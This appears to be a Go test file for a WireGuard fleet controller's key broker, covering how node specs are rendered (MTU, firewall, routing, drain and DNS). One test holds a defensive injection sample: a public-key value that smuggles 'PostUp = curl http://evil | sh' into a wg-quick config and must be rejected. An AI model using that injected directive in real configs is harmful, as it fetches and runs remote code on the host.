package keybroker

import (
	"context"
	"fmt"
	"io"
	"log/slog"
	"testing"

	"github.com/shidoh/wgfleet/internal/config"
	"github.com/shidoh/wgfleet/internal/controller/store"
	"github.com/shidoh/wgfleet/internal/domain"
)

func testFleet() config.FleetSection {
	return config.FleetSection{
		Masters: []config.MasterConfig{
			{
				Name:     "master-xa-1",
				MgmtAddr: "10.20.25.254",
				ClientAWG: config.ClientAWGConfig{
					ListenPort:  443,
					AddressPool: "10.80.0.0/24",
				},
				Routing: config.MasterRouting{
					DirectCIDRs: []string{"10.0.0.0/8", "192.168.0.0/16"},
					Balance:     "health",
				},
			},
		},
		Exits: []config.ExitConfig{
			{
				Name:        "exit-de-1",
				Region:      "de",
				Egress:      "warp",
				AddressPool: "10.81.0.0/24",
				DNSFilter:   true,
				Firewall:    config.FirewallConfig{ASBlacklist: true, Whitelist: []string{"10.20.0.0/16"}},
			},
		},
	}
}

func newBroker(t *testing.T) (*Broker, store.Store) {
	t.Helper()
	st, err := store.Open(":memory:")
	if err != nil {
		t.Fatalf("open store: %v", err)
	}
	t.Cleanup(func() { _ = st.Close() })
	log := slog.New(slog.NewTextHandler(io.Discard, nil))
	return New(st, testFleet(), log), st
}

func seedNode(t *testing.T, st store.Store, id, mgmt, public, pubkey string, role domain.Role) {
	t.Helper()
	ctx := context.Background()
	if err := st.UpsertNode(ctx, domain.Node{
		ID: id, Name: id, Role: role, MgmtAddr: mgmt, PublicIP: public,
		State: domain.StateReconciling,
	}); err != nil {
		t.Fatal(err)
	}
	if pubkey != "" {
		if err := st.SetNodePublicKey(ctx, id, pubkey); err != nil {
			t.Fatal(err)
		}
	}
}

func TestRenderExitSpec(t *testing.T) {
	ctx := context.Background()
	b, st := newBroker(t)
	seedNode(t, st, "master-xa-1", "10.20.25.254", "203.0.113.1", "FmJoBTB+ew7wVUxXhRs6xCNPjPi9SQJRU6vIVW4Igyc=", domain.RoleMaster)
	seedNode(t, st, "exit-de-1", "10.20.0.5", "198.51.100.7", "A/3Hs1FWpM4iZiG09od1cESePk+PiG2Tg1jKlvX3BFY=", domain.RoleExit)

	spec, err := b.RenderNodeSpec(ctx, "exit-de-1")
	if err != nil {
		t.Fatalf("render: %v", err)
	}
	if spec.Role != domain.RoleExit || spec.Egress != domain.EgressWARP {
		t.Fatalf("role/egress = %v/%v", spec.Role, spec.Egress)
	}
	// Unset listen_port ⇒ a stable per-node derived port (randomized, not 51820).
	wantPort := config.ExitConfig{Name: "exit-de-1"}.WGListenPort()
	if wantPort < 20000 || wantPort > 32000 {
		t.Errorf("derived exit port %d out of the expected range", wantPort)
	}
	if spec.WGServer.ListenPort != wantPort {
		t.Errorf("listen port = %d, want derived %d", spec.WGServer.ListenPort, wantPort)
	}
	if spec.WGServer.Address != "10.81.0.1" {
		t.Errorf("exit address = %q, want 10.81.0.1", spec.WGServer.Address)
	}
	if spec.WGServer.MTU != 1360 {
		t.Errorf("server MTU = %d, want 1360 (AWG tunnel: 1500-140)", spec.WGServer.MTU)
	}
	// The master↔exit tunnel is AmneziaWG: the interface must carry valid AWG.
	if spec.WGServer.AWG == nil {
		t.Fatal("exit WG server must have AmneziaWG params (fleet tunnels are AWG)")
	}
	if err := spec.WGServer.AWG.Validate(); err != nil {
		t.Errorf("rendered AWG params invalid: %v", err)
	}
	// Master must appear as a peer with no endpoint (master dials the exit).
	if len(spec.Peers) != 1 {
		t.Fatalf("peers = %d, want 1", len(spec.Peers))
	}
	mp := spec.Peers[0]
	if mp.Name != "master-xa-1" || mp.PublicKey != "FmJoBTB+ew7wVUxXhRs6xCNPjPi9SQJRU6vIVW4Igyc=" {
		t.Errorf("master peer = %+v", mp)
	}
	if mp.Endpoint != "" {
		t.Errorf("master peer endpoint should be empty, got %q", mp.Endpoint)
	}
	if len(mp.AllowedIPs) != 1 || mp.AllowedIPs[0] != "10.81.0.2/32" {
		t.Errorf("master peer AllowedIPs = %v, want [10.81.0.2/32]", mp.AllowedIPs)
	}
	// Routing: WARP egress + master kept direct.
	if spec.Routing.EgressInterface != "wgcf" {
		t.Errorf("egress interface = %q, want wgcf", spec.Routing.EgressInterface)
	}
	if spec.Routing.MasterIP != "203.0.113.1" {
		t.Errorf("master IP = %q", spec.Routing.MasterIP)
	}
	// DNS filter binds the mgmt address only; prometheus on by default.
	if !spec.DNS.Enabled || spec.DNS.MgmtAddr != "10.20.0.5" || !spec.DNS.Prometheus {
		t.Errorf("dns = %+v", spec.DNS)
	}
	if !spec.Firewall.ASBlacklist || spec.Firewall.WGPort != wantPort {
		t.Errorf("firewall = %+v (want WGPort %d)", spec.Firewall, wantPort)
	}
	if !spec.Exporters.WARP {
		t.Error("WARP exporter should be enabled for warp egress")
	}
	if err := spec.Validate(); err != nil {
		t.Errorf("rendered exit spec should be valid: %v", err)
	}
}

func contains(ss []string, want string) bool {
	for _, s := range ss {
		if s == want {
			return true
		}
	}
	return false
}

// The exit must trust the mgmt overlay without the operator hand-listing it:
// derived from node mgmt_addrs when fleet.mgmt_subnet is unset (the master's
// /32 here), it lands in BOTH the firewall whitelist and the routing direct-CIDRs.
func TestRenderExitSpecTrustsMgmtOverlay(t *testing.T) {
	ctx := context.Background()
	b, st := newBroker(t)
	seedNode(t, st, "master-xa-1", "10.20.25.254", "203.0.113.1", "FmJoBTB+ew7wVUxXhRs6xCNPjPi9SQJRU6vIVW4Igyc=", domain.RoleMaster)
	seedNode(t, st, "exit-de-1", "10.20.0.5", "198.51.100.7", "A/3Hs1FWpM4iZiG09od1cESePk+PiG2Tg1jKlvX3BFY=", domain.RoleExit)

	spec, err := b.RenderNodeSpec(ctx, "exit-de-1")
	if err != nil {
		t.Fatalf("render: %v", err)
	}
	const mgmt = "10.20.25.254/32" // master's mgmt_addr as a host route
	if !contains(spec.Firewall.Whitelist, mgmt) {
		t.Errorf("mgmt overlay missing from firewall whitelist: %v", spec.Firewall.Whitelist)
	}
	if !contains(spec.Firewall.Whitelist, "10.20.0.0/16") {
		t.Errorf("operator whitelist entry dropped: %v", spec.Firewall.Whitelist)
	}
	if !contains(spec.Routing.DirectCIDRs, mgmt) {
		t.Errorf("mgmt overlay missing from direct CIDRs: %v", spec.Routing.DirectCIDRs)
	}
	// Operator's direct CIDRs are preserved.
	for _, want := range []string{"10.0.0.0/8", "192.168.0.0/16"} {
		if !contains(spec.Routing.DirectCIDRs, want) {
			t.Errorf("operator direct CIDR %q dropped: %v", want, spec.Routing.DirectCIDRs)
		}
	}
}

// An explicit fleet.mgmt_subnet is the authoritative scope: the whole overlay
// subnet (not per-node /32s) is trusted for routing-direct and firewall-accept.
func TestRenderExitSpecMgmtSubnetWins(t *testing.T) {
	ctx := context.Background()
	fleet := testFleet()
	fleet.MgmtSubnet = "10.20.0.0/16"
	st, err := store.Open(":memory:")
	if err != nil {
		t.Fatalf("open store: %v", err)
	}
	t.Cleanup(func() { _ = st.Close() })
	b := New(st, fleet, slog.New(slog.NewTextHandler(io.Discard, nil)))
	seedNode(t, st, "master-xa-1", "10.20.25.254", "203.0.113.1", "FmJoBTB+ew7wVUxXhRs6xCNPjPi9SQJRU6vIVW4Igyc=", domain.RoleMaster)
	seedNode(t, st, "exit-de-1", "10.20.0.5", "198.51.100.7", "A/3Hs1FWpM4iZiG09od1cESePk+PiG2Tg1jKlvX3BFY=", domain.RoleExit)

	spec, err := b.RenderNodeSpec(ctx, "exit-de-1")
	if err != nil {
		t.Fatalf("render: %v", err)
	}
	if !contains(spec.Routing.DirectCIDRs, "10.20.0.0/16") {
		t.Errorf("mgmt subnet missing from direct CIDRs: %v", spec.Routing.DirectCIDRs)
	}
	// The per-node /32 must NOT appear — the subnet supersedes it.
	if contains(spec.Routing.DirectCIDRs, "10.20.25.254/32") {
		t.Errorf("per-node /32 leaked when subnet is set: %v", spec.Routing.DirectCIDRs)
	}
}

func TestRenderMasterSpec(t *testing.T) {
	ctx := context.Background()
	b, st := newBroker(t)
	seedNode(t, st, "master-xa-1", "10.20.25.254", "203.0.113.1", "FmJoBTB+ew7wVUxXhRs6xCNPjPi9SQJRU6vIVW4Igyc=", domain.RoleMaster)
	seedNode(t, st, "exit-de-1", "10.20.0.5", "198.51.100.7", "A/3Hs1FWpM4iZiG09od1cESePk+PiG2Tg1jKlvX3BFY=", domain.RoleExit)

	spec, err := b.RenderNodeSpec(ctx, "master-xa-1")
	if err != nil {
		t.Fatalf("render: %v", err)
	}
	if spec.Role != domain.RoleMaster {
		t.Fatalf("role = %v", spec.Role)
	}
	if spec.WGServer.ListenPort != 443 || spec.WGServer.AddressPool != "10.80.0.0/24" {
		t.Errorf("client AWG server = %+v", spec.WGServer)
	}
	// The master now reconciles an input firewall: it must open the client port and
	// trust the mgmt overlay (so the input-drop policy never locks management out).
	if spec.Firewall.WGPort != 443 {
		t.Errorf("master firewall WGPort = %d, want 443", spec.Firewall.WGPort)
	}
	if !contains(spec.Firewall.Whitelist, "10.20.25.254/32") {
		t.Errorf("master firewall whitelist missing mgmt overlay: %v", spec.Firewall.Whitelist)
	}
	// The exit must appear as a mihomo exit tunnel (not a kernel peer).
	if spec.Master == nil {
		t.Fatal("master spec missing mihomo data plane")
	}
	m := spec.Master
	if m.BindAddress != "10.80.0.1" {
		t.Errorf("bind address = %q, want 10.80.0.1", m.BindAddress)
	}
	if m.ExternalController != "10.20.25.254:9090" {
		t.Errorf("external controller = %q", m.ExternalController)
	}
	if len(m.ExitTunnels) != 1 {
		t.Fatalf("exit tunnels = %d, want 1", len(m.ExitTunnels))
	}
	et := m.ExitTunnels[0]
	if et.Name != "exit-de-1" || et.ServerPublicKey != "A/3Hs1FWpM4iZiG09od1cESePk+PiG2Tg1jKlvX3BFY=" {
		t.Errorf("exit tunnel = %+v", et)
	}
	// The exit's own public IP must route DIRECT (not via wg-best/WARP) so client
	// SSH/management to it works on a full-tunnel client and never hairpins out WARP.
	if !contains(m.DirectCIDRs, "198.51.100.7/32") {
		t.Errorf("exit public IP missing from master DIRECT cidrs: %v", m.DirectCIDRs)
	}
	wantEndpoint := fmt.Sprintf("198.51.100.7:%d", config.ExitConfig{Name: "exit-de-1"}.WGListenPort())
	if et.Endpoint != wantEndpoint {
		t.Errorf("exit tunnel endpoint = %q, want %q", et.Endpoint, wantEndpoint)
	}
	if et.TunnelIP != "10.81.0.2" {
		t.Errorf("master tunnel IP = %q, want 10.81.0.2", et.TunnelIP)
	}
	if et.AWG == nil {
		t.Fatal("exit tunnel missing AWG params")
	}
	// The tunnel's AWG must match what the exit's own interface derives (both
	// ends use the same seed).
	exitSpec, _ := b.RenderNodeSpec(ctx, "exit-de-1")
	if exitSpec.WGServer.AWG == nil || et.AWG.Shared != exitSpec.WGServer.AWG.Shared {
		t.Error("master tunnel AWG shared params must match the exit interface's")
	}
}

// A node re-added after its store record was deleted (the drain→decommission→
// delete→re-add lifecycle) re-registers without a PublicIP — the agent's Register
// sends none and provisioning didn't re-seed inventory. The master endpoint must
// fall back to the manifest's ssh.host (or public_ip) instead of rendering an empty
// endpoint that fails the whole master mihomo plan.
func TestRenderMasterSpecFallsBackToManifestPublicIP(t *testing.T) {
	ctx := context.Background()
	st, err := store.Open(":memory:")
	if err != nil {
		t.Fatalf("open store: %v", err)
	}
	t.Cleanup(func() { _ = st.Close() })
	log := slog.New(slog.NewTextHandler(io.Discard, nil))
	fleet := testFleet()
	fleet.Exits[0].SSH = config.SSHConfig{Host: "203.0.113.50"}
	b := New(st, fleet, log)

	seedNode(t, st, "master-xa-1", "10.20.25.254", "203.0.113.1", "FmJoBTB+ew7wVUxXhRs6xCNPjPi9SQJRU6vIVW4Igyc=", domain.RoleMaster)
	// Exit registered (pubkey present) but PublicIP empty in the store.
	seedNode(t, st, "exit-de-1", "10.20.0.5", "", "A/3Hs1FWpM4iZiG09od1cESePk+PiG2Tg1jKlvX3BFY=", domain.RoleExit)

	spec, err := b.RenderNodeSpec(ctx, "master-xa-1")
	if err != nil {
		t.Fatalf("render: %v", err)
	}
	if spec.Master == nil || len(spec.Master.ExitTunnels) != 1 {
		t.Fatalf("expected 1 exit tunnel, got %+v", spec.Master)
	}
	et := spec.Master.ExitTunnels[0]
	wantEndpoint := fmt.Sprintf("203.0.113.50:%d", config.ExitConfig{Name: "exit-de-1"}.WGListenPort())
	if et.Endpoint != wantEndpoint {
		t.Errorf("exit endpoint = %q, want %q (manifest ssh.host fallback)", et.Endpoint, wantEndpoint)
	}
	if !contains(spec.Master.DirectCIDRs, "203.0.113.50/32") {
		t.Errorf("fallback public IP missing from DIRECT cidrs: %v", spec.Master.DirectCIDRs)
	}
}

func TestRenderSkipsUnregisteredPeer(t *testing.T) {
	ctx := context.Background()
	b, st := newBroker(t)
	// Master registered, exit NOT (no pubkey yet).
	seedNode(t, st, "master-xa-1", "10.20.25.254", "203.0.113.1", "FmJoBTB+ew7wVUxXhRs6xCNPjPi9SQJRU6vIVW4Igyc=", domain.RoleMaster)
	seedNode(t, st, "exit-de-1", "10.20.0.5", "198.51.100.7", "", domain.RoleExit)

	spec, err := b.RenderNodeSpec(ctx, "master-xa-1")
	if err != nil {
		t.Fatalf("render: %v", err)
	}
	if spec.Master == nil || len(spec.Master.ExitTunnels) != 0 {
		t.Errorf("unregistered exit should be omitted from master mihomo proxies")
	}
}

func TestRegisterPublicKey(t *testing.T) {
	ctx := context.Background()
	b, st := newBroker(t)
	seedNode(t, st, "exit-de-1", "10.20.0.5", "198.51.100.7", "", domain.RoleExit)

	if err := b.RegisterPublicKey(ctx, "exit-de-1", "/Lpxg7UgcxjrQcfYYl9CaqXDLy/bYSHQ3iD/KXnY1zU="); err != nil {
		t.Fatalf("register: %v", err)
	}
	node, _ := st.GetNode(ctx, "exit-de-1")
	if node.PublicKey != "/Lpxg7UgcxjrQcfYYl9CaqXDLy/bYSHQ3iD/KXnY1zU=" {
		t.Errorf("public key = %q", node.PublicKey)
	}
	if err := b.RegisterPublicKey(ctx, "exit-de-1", ""); err == nil {
		t.Error("empty public key should be rejected")
	}

	// A malformed key (not a 32-byte Curve25519 key) must be rejected before it is
	// stored — it would otherwise be rendered verbatim into peer WG configs. A
	// multi-line value attempting wg-quick directive injection is the attack.
	for _, bad := range []string{
		"not-a-key",
		"short==",
		"FmJoBTB+ew7wVUxXhRs6xCNPjPi9SQJRU6vIVW4Igyc=\nPostUp = curl http://evil | sh",
	} {
		if err := b.RegisterPublicKey(ctx, "exit-de-1", bad); err == nil {
			t.Errorf("malformed public key %q should be rejected", bad)
		}
	}
}

func TestRenderUnknownNode(t *testing.T) {
	b, _ := newBroker(t)
	if _, err := b.RenderNodeSpec(context.Background(), "ghost"); err == nil {
		t.Fatal("expected error for node absent from fleet manifest")
	}
}

func TestMasterSpecHonorsDrain(t *testing.T) {
	ctx := context.Background()
	b, st := newBroker(t)
	seedNode(t, st, "master-xa-1", "10.20.25.254", "203.0.113.1", "FmJoBTB+ew7wVUxXhRs6xCNPjPi9SQJRU6vIVW4Igyc=", domain.RoleMaster)
	seedNode(t, st, "exit-de-1", "10.20.0.5", "198.51.100.7", "A/3Hs1FWpM4iZiG09od1cESePk+PiG2Tg1jKlvX3BFY=", domain.RoleExit)
	if err := st.SetNodeDrain(ctx, "exit-de-1", true); err != nil {
		t.Fatal(err)
	}

	spec, err := b.RenderNodeSpec(ctx, "master-xa-1")
	if err != nil {
		t.Fatalf("render: %v", err)
	}
	if spec.Master == nil || len(spec.Master.ExitTunnels) != 1 {
		t.Fatalf("exit tunnels = %+v", spec.Master)
	}
	// Drained node is still a tunnel, but flagged for LB exclusion.
	if !spec.Master.ExitTunnels[0].Drained {
		t.Error("draining the exit must set ExitTunnel.Drained in the master spec")
	}
}

func TestMasterSpecComposeDerivesClientDNS(t *testing.T) {
	ctx := context.Background()
	b, st := newBroker(t)
	seedNode(t, st, "master-xa-1", "10.20.25.254", "203.0.113.1", "FmJoBTB+ew7wVUxXhRs6xCNPjPi9SQJRU6vIVW4Igyc=", domain.RoleMaster)
	seedNode(t, st, "exit-de-1", "10.20.0.5", "198.51.100.7", "A/3Hs1FWpM4iZiG09od1cESePk+PiG2Tg1jKlvX3BFY=", domain.RoleExit)

	spec, err := b.RenderNodeSpec(ctx, "master-xa-1")
	if err != nil {
		t.Fatal(err)
	}
	c := spec.Master.Compose
	// Public IP seeded from the master node; client DNS derived from exit mgmt addr.
	if c.PublicIP != "203.0.113.1" {
		t.Errorf("compose public IP = %q, want 203.0.113.1", c.PublicIP)
	}
	if len(c.ClientDNS) != 1 || c.ClientDNS[0] != "10.20.0.5" {
		t.Errorf("client DNS = %v, want [10.20.0.5] (exit mgmt addr)", c.ClientDNS)
	}
}

func TestDecommissionSpec(t *testing.T) {
	ctx := context.Background()
	b, st := newBroker(t)
	seedNode(t, st, "exit-de-1", "10.20.0.5", "198.51.100.7", "A/3Hs1FWpM4iZiG09od1cESePk+PiG2Tg1jKlvX3BFY=", domain.RoleExit)
	if err := st.SetNodeDecommission(ctx, "exit-de-1", true); err != nil {
		t.Fatal(err)
	}
	spec, err := b.RenderNodeSpec(ctx, "exit-de-1")
	if err != nil {
		t.Fatal(err)
	}
	if !spec.Decommission {
		t.Error("decommissioning node must get a teardown spec")
	}
	if spec.Role != domain.RoleExit {
		t.Errorf("teardown spec role = %q", spec.Role)
	}
	if err := spec.Validate(); err != nil {
		t.Errorf("teardown spec should validate: %v", err)
	}
}

func TestDecommissioningExitDroppedFromMaster(t *testing.T) {
	ctx := context.Background()
	b, st := newBroker(t)
	seedNode(t, st, "master-xa-1", "10.20.25.254", "203.0.113.1", "FmJoBTB+ew7wVUxXhRs6xCNPjPi9SQJRU6vIVW4Igyc=", domain.RoleMaster)
	seedNode(t, st, "exit-de-1", "10.20.0.5", "198.51.100.7", "A/3Hs1FWpM4iZiG09od1cESePk+PiG2Tg1jKlvX3BFY=", domain.RoleExit)
	_ = st.SetNodeDecommission(ctx, "exit-de-1", true)

	spec, err := b.RenderNodeSpec(ctx, "master-xa-1")
	if err != nil {
		t.Fatal(err)
	}
	if spec.Master == nil || len(spec.Master.ExitTunnels) != 0 {
		t.Errorf("decommissioning exit must be dropped from master tunnels, got %+v", spec.Master)
	}
}

func TestWARPMTUDefault(t *testing.T) {
	ctx := context.Background()
	b, st := newBroker(t)
	seedNode(t, st, "master-xa-1", "10.20.25.254", "203.0.113.1", "FmJoBTB+ew7wVUxXhRs6xCNPjPi9SQJRU6vIVW4Igyc=", domain.RoleMaster)
	seedNode(t, st, "exit-de-1", "10.20.0.5", "198.51.100.7", "A/3Hs1FWpM4iZiG09od1cESePk+PiG2Tg1jKlvX3BFY=", domain.RoleExit)

	exitSpec, err := b.RenderNodeSpec(ctx, "exit-de-1")
	if err != nil {
		t.Fatal(err)
	}
	if exitSpec.WARPMTU != 1440 {
		t.Errorf("default exit WARPMTU = %d, want 1440 (1500-60)", exitSpec.WARPMTU)
	}
	masterSpec, err := b.RenderNodeSpec(ctx, "master-xa-1")
	if err != nil {
		t.Fatal(err)
	}
	// Default WARP (1440) is above the 1360 AWG hop, so the client binds at 1360.
	if masterSpec.WGServer.MTU != 1360 {
		t.Errorf("default client MTU = %d, want 1360", masterSpec.WGServer.MTU)
	}
}

func TestWARPMTUOverrideLowersClientMTU(t *testing.T) {
	ctx := context.Background()
	st, err := store.Open(":memory:")
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = st.Close() })
	log := slog.New(slog.NewTextHandler(io.Discard, nil))

	fleet := testFleet()
	fleet.Exits[0].WARPMTU = 1340 // operator pins a constrained WARP path
	b := New(st, fleet, log)
	seedNode(t, st, "master-xa-1", "10.20.25.254", "203.0.113.1", "FmJoBTB+ew7wVUxXhRs6xCNPjPi9SQJRU6vIVW4Igyc=", domain.RoleMaster)
	seedNode(t, st, "exit-de-1", "10.20.0.5", "198.51.100.7", "A/3Hs1FWpM4iZiG09od1cESePk+PiG2Tg1jKlvX3BFY=", domain.RoleExit)

	exitSpec, err := b.RenderNodeSpec(ctx, "exit-de-1")
	if err != nil {
		t.Fatal(err)
	}
	if exitSpec.WARPMTU != 1340 {
		t.Errorf("exit WARPMTU = %d, want 1340 (operator override)", exitSpec.WARPMTU)
	}
	// The constrained exit WARP (1340) is below the 1360 AWG hop, so the client
	// MTU must drop to 1340 — otherwise a full client packet fragments at egress.
	masterSpec, err := b.RenderNodeSpec(ctx, "master-xa-1")
	if err != nil {
		t.Fatal(err)
	}
	if masterSpec.WGServer.MTU != 1340 {
		t.Errorf("client MTU = %d, want 1340 (bound by the constrained exit WARP)", masterSpec.WGServer.MTU)
	}
}

func TestExitLinkMTULowersTunnelAndClientMTU(t *testing.T) {
	ctx := context.Background()
	st, err := store.Open(":memory:")
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = st.Close() })
	log := slog.New(slog.NewTextHandler(io.Discard, nil))

	fleet := testFleet()
	// The exit sits on a narrow path (master→exit ping caps near 1400); pin link_mtu
	// so the master↔exit AmneziaWG carrier packets fit instead of black-holing (the
	// "tunnel up but intermittently hangs" symptom, an earlier finding).
	fleet.Exits[0].LinkMTU = 1400
	b := New(st, fleet, log)
	seedNode(t, st, "master-xa-1", "10.20.25.254", "203.0.113.1", "FmJoBTB+ew7wVUxXhRs6xCNPjPi9SQJRU6vIVW4Igyc=", domain.RoleMaster)
	seedNode(t, st, "exit-de-1", "10.20.0.5", "198.51.100.7", "A/3Hs1FWpM4iZiG09od1cESePk+PiG2Tg1jKlvX3BFY=", domain.RoleExit)

	const wantTunnel = 1400 - 140 // one AmneziaWG layer over the 1400 link

	// Exit awg0 server MTU drops to the link-derived tunnel MTU.
	exitSpec, err := b.RenderNodeSpec(ctx, "exit-de-1")
	if err != nil {
		t.Fatal(err)
	}
	if exitSpec.WGServer.MTU != wantTunnel {
		t.Errorf("exit server MTU = %d, want %d (1400 link - 140 AWG)", exitSpec.WGServer.MTU, wantTunnel)
	}

	masterSpec, err := b.RenderNodeSpec(ctx, "master-xa-1")
	if err != nil {
		t.Fatal(err)
	}
	// The master's mihomo proxy for this exit must match the exit's server MTU — both
	// ends of the master↔exit tunnel derive from the same link_mtu.
	if len(masterSpec.Master.ExitTunnels) == 0 {
		t.Fatal("master should have one exit tunnel")
	}
	if got := masterSpec.Master.ExitTunnels[0].MTU; got != wantTunnel {
		t.Errorf("master↔exit proxy MTU = %d, want %d (must match exit server)", got, wantTunnel)
	}
	// The client interface drops to the narrowest hop so a full client packet never
	// exceeds what the master↔exit tunnel carries (sequential model, ADR-0014).
	if masterSpec.WGServer.MTU != wantTunnel {
		t.Errorf("client MTU = %d, want %d (bound by the narrow exit link)", masterSpec.WGServer.MTU, wantTunnel)
	}
}

func TestExitSpecThroughputFields(t *testing.T) {
	ctx := context.Background()
	b, st := newBroker(t)
	seedNode(t, st, "master-xa-1", "10.20.25.254", "203.0.113.1", "FmJoBTB+ew7wVUxXhRs6xCNPjPi9SQJRU6vIVW4Igyc=", domain.RoleMaster)
	seedNode(t, st, "exit-de-1", "10.20.0.5", "198.51.100.7", "A/3Hs1FWpM4iZiG09od1cESePk+PiG2Tg1jKlvX3BFY=", domain.RoleExit)

	spec, err := b.RenderNodeSpec(ctx, "exit-de-1")
	if err != nil {
		t.Fatal(err)
	}
	// Default fleet floor (250 KB/s) is rendered as bytes/sec into the spec.
	if want := config.DefaultMinEgressThroughputKBytes * 1024; spec.EgressThroughputMinBps != want {
		t.Errorf("EgressThroughputMinBps = %d, want %d", spec.EgressThroughputMinBps, want)
	}
}

func recordThroughputDegraded(t *testing.T, st store.Store, id string, ok bool) {
	t.Helper()
	if err := st.RecordStatus(context.Background(), domain.NodeStatus{
		NodeID: id, State: domain.StateReady,
		Checks: []domain.HealthCheck{{Name: domain.CheckEgressThroughput, OK: ok, Detail: "test"}},
	}); err != nil {
		t.Fatal(err)
	}
}

func tunnelByName(tunnels []domain.ExitTunnel, name string) (domain.ExitTunnel, bool) {
	for _, x := range tunnels {
		if x.Name == name {
			return x, true
		}
	}
	return domain.ExitTunnel{}, false
}

func TestAutoSuspendThroughputDegraded(t *testing.T) {
	ctx := context.Background()
	st, err := store.Open(":memory:")
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = st.Close() })
	log := slog.New(slog.NewTextHandler(io.Discard, nil))

	fleet := testFleet()
	fleet.Exits = append(fleet.Exits, config.ExitConfig{Name: "exit-de-2", Egress: "warp", AddressPool: "10.82.0.0/24"})
	b := New(st, fleet, log)
	seedNode(t, st, "master-xa-1", "10.20.25.254", "203.0.113.1", "FmJoBTB+ew7wVUxXhRs6xCNPjPi9SQJRU6vIVW4Igyc=", domain.RoleMaster)
	seedNode(t, st, "exit-de-1", "10.20.0.5", "198.51.100.7", "A/3Hs1FWpM4iZiG09od1cESePk+PiG2Tg1jKlvX3BFY=", domain.RoleExit)
	seedNode(t, st, "exit-de-2", "10.20.0.6", "198.51.100.8", "bGm5lqV2yYt8m6Dl0sFhT4xQ0r9p7zX1cV2bN3mK4U=", domain.RoleExit)

	// exit-de-2 reports throughput-degraded; exit-de-1 is healthy.
	recordThroughputDegraded(t, st, "exit-de-1", true)
	recordThroughputDegraded(t, st, "exit-de-2", false)

	spec, err := b.RenderNodeSpec(ctx, "master-xa-1")
	if err != nil {
		t.Fatal(err)
	}
	t1, _ := tunnelByName(spec.Master.ExitTunnels, "exit-de-1")
	t2, _ := tunnelByName(spec.Master.ExitTunnels, "exit-de-2")
	if t1.Drained {
		t.Error("healthy exit-de-1 must stay in the LB group")
	}
	if !t2.Drained {
		t.Error("throughput-degraded exit-de-2 must be auto-suspended from the LB group")
	}

	// Last-exit guard: if BOTH exits are degraded, neither is suspended (a throttled
	// exit beats a black hole).
	recordThroughputDegraded(t, st, "exit-de-1", false)
	spec, err = b.RenderNodeSpec(ctx, "master-xa-1")
	if err != nil {
		t.Fatal(err)
	}
	for _, x := range spec.Master.ExitTunnels {
		if x.Drained {
			t.Errorf("all-degraded: %s must NOT be auto-suspended (last-exit guard)", x.Name)
		}
	}
}

func TestAutoSuspendSingleExitGuard(t *testing.T) {
	ctx := context.Background()
	b, st := newBroker(t) // testFleet has exactly one exit
	seedNode(t, st, "master-xa-1", "10.20.25.254", "203.0.113.1", "FmJoBTB+ew7wVUxXhRs6xCNPjPi9SQJRU6vIVW4Igyc=", domain.RoleMaster)
	seedNode(t, st, "exit-de-1", "10.20.0.5", "198.51.100.7", "A/3Hs1FWpM4iZiG09od1cESePk+PiG2Tg1jKlvX3BFY=", domain.RoleExit)
	// The only exit reports throughput-degraded — it MUST stay in the LB (suspending
	// it would black-hole all clients; the last-exit guard forbids it).
	recordThroughputDegraded(t, st, "exit-de-1", false)

	spec, err := b.RenderNodeSpec(ctx, "master-xa-1")
	if err != nil {
		t.Fatal(err)
	}
	x, ok := tunnelByName(spec.Master.ExitTunnels, "exit-de-1")
	if !ok {
		t.Fatal("expected the single exit tunnel")
	}
	if x.Drained {
		t.Error("the only exit must never be auto-suspended (last-exit guard)")
	}
}

func TestRenderExitSpecEgressChain(t *testing.T) {
	st, err := store.Open(":memory:")
	if err != nil {
		t.Fatalf("open store: %v", err)
	}
	t.Cleanup(func() { _ = st.Close() })
	log := slog.New(slog.NewTextHandler(io.Discard, nil))

	fleet := config.FleetSection{
		Exits: []config.ExitConfig{{
			Name:           "exit-de-1",
			Egress:         "warp",
			EgressFallback: []string{"direct", "warp", "bogus"}, // dup + invalid dropped
			AddressPool:    "10.81.0.0/24",
		}},
	}
	b := New(st, fleet, log)
	seedNode(t, st, "exit-de-1", "10.20.0.10", "203.0.113.10", "exitpub", domain.RoleExit)

	spec, err := b.RenderNodeSpec(context.Background(), "exit-de-1")
	if err != nil {
		t.Fatal(err)
	}
	want := []domain.EgressMethod{domain.EgressWARP, domain.EgressDirect}
	if len(spec.EgressChain) != len(want) {
		t.Fatalf("egress chain = %v, want %v", spec.EgressChain, want)
	}
	for i := range want {
		if spec.EgressChain[i] != want[i] {
			t.Errorf("chain[%d] = %q, want %q", i, spec.EgressChain[i], want[i])
		}
	}
	if spec.Egress != domain.EgressWARP {
		t.Errorf("preferred egress = %q, want warp", spec.Egress)
	}
}

func TestRenderMasterDNS(t *testing.T) {
	// Master-tier blocky (ADR-0024): the master resolver forwards public queries to
	// the active exit blockys, layers operator blocking/conditional via overrides, and
	// clients are handed the master gateway as their single DNS.
	ctx := context.Background()
	fleet := testFleet()
	fleet.Masters[0].DNSFilter = true
	fleet.Masters[0].DNS = config.DNSConfig{
		Allowlist: []string{"*.example.com"},
		Overrides: map[string]any{
			"conditional": map[string]any{
				"mapping": map[string]any{"lab.lan": "10.200.99.1"},
			},
		},
	}
	st, err := store.Open(":memory:")
	if err != nil {
		t.Fatalf("open store: %v", err)
	}
	t.Cleanup(func() { _ = st.Close() })
	b := New(st, fleet, slog.New(slog.NewTextHandler(io.Discard, nil)))
	seedNode(t, st, "master-xa-1", "10.20.25.254", "203.0.113.1", "FmJoBTB+ew7wVUxXhRs6xCNPjPi9SQJRU6vIVW4Igyc=", domain.RoleMaster)
	seedNode(t, st, "exit-de-1", "10.20.0.5", "198.51.100.7", "A/3Hs1FWpM4iZiG09od1cESePk+PiG2Tg1jKlvX3BFY=", domain.RoleExit)

	spec, err := b.RenderNodeSpec(ctx, "master-xa-1")
	if err != nil {
		t.Fatalf("render: %v", err)
	}
	if !spec.DNS.Enabled {
		t.Fatal("master DNS should be enabled")
	}
	if spec.DNS.MgmtAddr != "10.20.25.254" {
		t.Errorf("master DNS mgmt bind = %q, want the master mgmt addr", spec.DNS.MgmtAddr)
	}
	// The default upstream group is the active exit blocky (its mgmt address).
	if !contains(spec.DNS.Upstreams, "10.20.0.5") {
		t.Errorf("master DNS upstreams should be the exit blockys, got %v", spec.DNS.Upstreams)
	}
